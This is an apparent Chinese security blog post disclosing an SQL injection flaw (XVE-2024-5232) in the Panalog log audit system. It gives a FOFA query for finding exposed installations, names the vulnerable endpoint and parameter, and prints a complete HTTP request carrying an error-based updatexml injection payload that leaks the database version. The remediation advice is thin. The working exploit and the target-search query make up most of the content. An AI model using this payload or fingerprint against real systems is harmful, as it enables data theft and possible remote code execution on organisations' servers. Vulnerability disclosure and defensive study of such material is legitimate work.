#  Panalog 日志审计系统 SQL 注入漏洞【XVE-2024-5232】   
小酸弟  小酸弟信安   2024-08-05 09:28  
  
01 简介及指纹  
  
Panalog大数据日志审计系统是一款专注于大数据日志管理和审计的系统，旨在帮助企业和组织有效地管理、分析和审计大量日志数据。  
  
资产检索 FOFA：body="Maintain/cloud_index.php"  
  
02 漏洞概述  
  
 /Maintain/sprog_upstatus.php 接口处的 id 参数存在 SQL 注入漏洞，可导致数据库信息泄露从而获取敏感信息，严重导致rce。  
  
03 影响版本  
  
Panalog 日志审计系统  
  
04 环境搭  
建  
  
Panalog 日志审计系统  
  
05 漏洞复现   
  
完整数据包  
```
GET /Maintain/sprog_upstatus.php?status=1&rdb=1&id=1%20and%20updatexml(1,concat(0x7e,version(),0x7e),1) HTTP/1.1
Host: 127.0.0.1
Connection: keep-alive
sec-ch-ua: "Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"
Accept: */*
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
sec-ch-ua-platform: "Windows"
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/7Hgh5UvhnkJghmHbuJ6MiccXjzhrnLK5ku9XqKFnxap3ZTQw2WrRYGDgzvVgw7VzAIX8epfZia9NHUl951lXSOBQ/640?wx_fmt=png&from=appmsg "")  
  
05 漏洞修复  
  
在防火墙进行管控。  
  
及时关注厂商的修复补丁。  
  
  
  
  
